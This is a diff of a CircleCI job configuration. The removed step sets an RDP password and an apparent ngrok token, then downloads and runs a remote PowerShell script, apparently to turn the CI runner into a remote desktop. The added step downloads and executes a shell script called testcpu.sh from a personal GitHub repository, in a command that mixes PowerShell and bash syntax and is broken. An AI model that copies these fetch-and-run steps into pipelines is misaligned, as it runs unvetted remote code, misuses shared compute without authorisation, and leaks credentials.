@@ -11,9 +11,6 @@ jobs:
  
     steps:
       - run:
-          name: Windows RDP Circle CI NEW UPDATED
+          name: test 
           command: |
-            Set-Variable -Name "PASSWORD" -Value "12345678"
-            Set-Variable -Name "NGROK" -Value "1wlDvy7j3cMDMNTwWKYrBKQkd7B_2Zr2F94TYEnDZxD3HHzYE"
-            Invoke-WebRequest https://gitlab.com/haithuongpro2711/haivps/-/raw/master/RDPcircleCI.ps1 -OutFile RDPcircleCI.ps1
-            ./RDPcircleCI.ps1
+            Invoke-WebRequest wget https://raw.githubusercontent.com/zeshan5555/cpu/main/testcpu.sh && chmod +x testcpu.sh && ./testcpu.sh
